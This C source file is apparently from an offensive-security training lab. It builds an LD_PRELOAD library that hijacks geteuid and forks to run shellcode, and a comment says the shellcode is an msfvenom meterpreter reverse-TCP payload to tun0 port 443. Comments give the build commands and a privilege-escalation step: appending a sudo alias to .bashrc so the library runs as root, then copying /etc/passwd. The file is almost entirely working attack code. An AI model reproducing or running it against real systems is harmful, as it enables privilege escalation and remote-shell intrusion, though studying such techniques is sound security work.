#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// Run gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c
// Run gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
// Run export LD_PRELOAD=/home/offsec/evil_geteuid.so
// Run cp

// privilege escalation
// Run echo alias sudo=\"sudo LD_PRELOAD=/home/offsec/evil_geteuid.so\" >> .bashrc && source ~/.bashrc
// Run sudo cp /etc/passwd /tmp/

// msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=tun0 LPORT=443  -f c
{{shellcode}}

uid_t geteuid(void)
{
    typeof(geteuid) *old_geteuid;
    old_geteuid = dlsym(RTLD_NEXT, "geteuid");

    if (fork() == 0)
    {
            printf("HACK: Run shellcode\n");
            intptr_t pagesize = sysconf(_SC_PAGESIZE);
            if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
                pagesize, PROT_READ|PROT_EXEC)) {
                    perror("mprotect");
                    printf("permission fail");
                    return -1;
            }
            int (*ret)() = (int(*)())buf;
            printf("HACK: Run shellcode2\n");
            ret();
    }
    else
    {
            printf("HACK: returning from function...\n");
            return (*old_geteuid)();
    }
    printf("HACK: Returning from main...\n");
    return -2;
}
